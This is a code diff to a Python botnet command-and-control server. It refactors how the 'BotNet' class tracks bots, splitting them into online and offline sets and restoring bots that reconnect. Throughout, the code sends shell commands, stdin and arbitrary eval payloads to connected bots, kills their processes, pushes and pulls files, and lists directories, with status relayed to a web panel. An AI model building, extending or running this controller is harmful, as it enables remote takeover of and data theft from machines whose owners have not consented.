@@ -34,67 +34,95 @@ class BotNet(Thread):
         super().__init__()
         self.connlock = threading.Lock()
         self.conncon = threading.Condition(self.connlock)
-        self.allConnections = {}
+        self.onlineConnections = {}
+        self.offlineConnections = {}
         self.logs = {}
         self.socketio = socketio
         self.filemanager = BotNetFileManager(downloadpath)
         self.payloadmanager = BotNetPayloadManager(payloadpath)
         self.downloaddir = downloadpath
 
-    def addConnection(self, user, conn):
+    def addConnection(self, user, clientsock, host_info, socketio):
         with self.connlock:
-            if user in self.allConnections:
-                pass  # TODO: How to deal with duplicate usernames?
-            self.allConnections[user] = conn
+            if user in self.offlineConnections:
+                print("Restoring connection")
+                conn = self.offlineConnections[user]
+                conn.setsocket(clientsock)
+            else:
+                conn = Bot(clientsock, host_info, socketio)
+            self.onlineConnections[user] = conn
             self.logs[user] = BotLog(user)
             self.conncon.notifyAll()
             # Notify recv thread
+            self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
     def removeConnection(self, user):
         # Will be making changes to allConnections
         with self.connlock:
-            if user in self.allConnections:
+            if user in self.onlineConnections:
                 # Wait for any sends to go through for this bot
                 # terminate and remove
                 try:
-                    self.allConnections[user].close()
+                    self.onlineConnections[user].close()
                 except:
                     pass
                 # Remove object, don't delete so sends still go through
-                self.allConnections.pop(user)
+                self.onlineConnections.pop(user)
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
+            elif user in self.offlineConnections:
+                self.offlineConnections.pop(user)
 
     def setOffline(self, user):
         # Will be making changes to allConnections
         with self.connlock:
-            if user in self.allConnections:
+            if user in self.onlineConnections:
                 # Wait for any sends to go through for this bot
                 # terminate and remove
                 try:
-                    self.allConnections[user].close()
+                    self.onlineConnections[user].close()
                 except:
                     pass
+                conn = self.onlineConnections.pop(user)
+                self.offlineConnections[user] = conn
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
 
-    def getConnections(self):
+    def getOnlineConnections(self):
         with self.connlock:
-            return self.allConnections.keys()
+            return self.onlineConnections.keys()
 
-    def getConnectionDetails(self):
+    def getConnectionDetails(self,spec=None):
+        '''
+        Returns a dictionary of {[username]:{"online":[T/F], "lastonline":[unixtime], "arch":[arch]}, ...}
+        '''
         with self.connlock:
-            dets = {}
-            for username in self.allConnections.keys():
-                pass # TODO
+            if spec:
+                if spec in self.onlineConnections:
+                    bot = self.onlineConnections[spec]
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                elif spec in self.offlineConnections:
+                    bot = self.offlineConnections[spec]
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                else:
+                    return {}
+            else:
+                dets = {}
+                for username in self.onlineConnections.keys():
+                    bot = self.onlineConnections[username]
+                    dets[username] = dict(online=bot.online,lastonline=bot.lastonline,arch=bot.arch)
+                for username in self.offlineConnections.keys():
+                    bot = self.offlineConnections[username]
+                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline,arch=bot.arch)
+                return dets
 
     def run(self):
         while True:
             with self.connlock:
-                bots = list(self.allConnections.values())
+                bots = list(self.onlineConnections.values())
                 while len(bots) == 0:
                     self.conncon.wait()
-                    bots = list(self.allConnections.values())
+                    bots = list(self.onlineConnections.values())
             # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
             # TODO maybe use pipe as interrupt instead of timeout?
             rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
@@ -170,8 +198,7 @@ class BotNet(Thread):
 
                 except IOError:
                     # Connection was interrupted, set to offline
-                    with self.connlock:
-                        self.removeConnection(user)
+                    self.setOffline(user)
 
     def getLog(self, user):
         with self.connlock:
@@ -189,8 +216,8 @@ class BotNet(Thread):
 
     def sendKillProc(self, user):
         with self.connlock:
-            if user in self.allConnections:
-                self.allConnections[user].send("True", type="kill")
+            if user in self.onlineConnections:
+                self.onlineConnections[user].send("True", type="kill")
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -198,9 +225,9 @@ class BotNet(Thread):
 
     def sendStdin(self, user, cmd):
         with self.connlock:
-            if user in self.allConnections:
+            if user in self.onlineConnections:
                 self.logs[user].logstdin(cmd)
-                self.allConnections[user].send(cmd, type="stdin")
+                self.onlineConnections[user].send(cmd, type="stdin")
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -208,9 +235,9 @@ class BotNet(Thread):
 
     def sendCmd(self, user, cmd):
         with self.connlock:
-            if user in self.allConnections:
+            if user in self.onlineConnections:
                 self.logs[user].logsdin("(cmd \""+cmd+"\")")
-                self.allConnections[user].send(cmd, type="cmd")
+                self.onlineConnections[user].send(cmd, type="cmd")
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -218,8 +245,8 @@ class BotNet(Thread):
 
     def sendEval(self, user, cmd):
         with self.connlock:
-            if user in self.allConnections:
-                self.allConnections[user].send(cmd, type="eval")
+            if user in self.onlineConnections:
+                self.onlineConnections[user].send(cmd, type="eval")
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -227,8 +254,8 @@ class BotNet(Thread):
 
     def sendFile(self, user, filename, fileobj):
         with self.connlock:
-            if user in self.allConnections:
-                self.allConnections[user].sendFile(filename, fileobj)
+            if user in self.onlineConnections:
+                self.onlineConnections[user].sendFile(filename, fileobj)
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -236,9 +263,9 @@ class BotNet(Thread):
 
     def startFileDownload(self, user, filename):
         with self.connlock:
-            if user in self.allConnections:
+            if user in self.onlineConnections:
                 if not self.filemanager.fileIsDownloading(user,filename):
-                    self.allConnections[user].startFileDownload(filename)
+                    self.onlineConnections[user].startFileDownload(filename)
                 return True
             return None
 
@@ -258,8 +285,8 @@ class BotNet(Thread):
 
     def requestLs(self, user, filename):
         with self.connlock:
-            if user in self.allConnections:
-                self.allConnections[user].requestLs(filename)
+            if user in self.onlineConnections:
+                self.onlineConnections[user].requestLs(filename)
 
     def getFileManager(self):
         return self.filemanager
@@ -326,7 +353,7 @@ class Bot:
         with self.datalock:
             if self.online:
                 self.sock.close()
-                self.sock = formatsock.FormatSocket(newsock)
+            self.sock = formatsock.FormatSocket(newsock)
             self.online = nowonline
             if self.online:
                 self.lastonline = int(time.time())
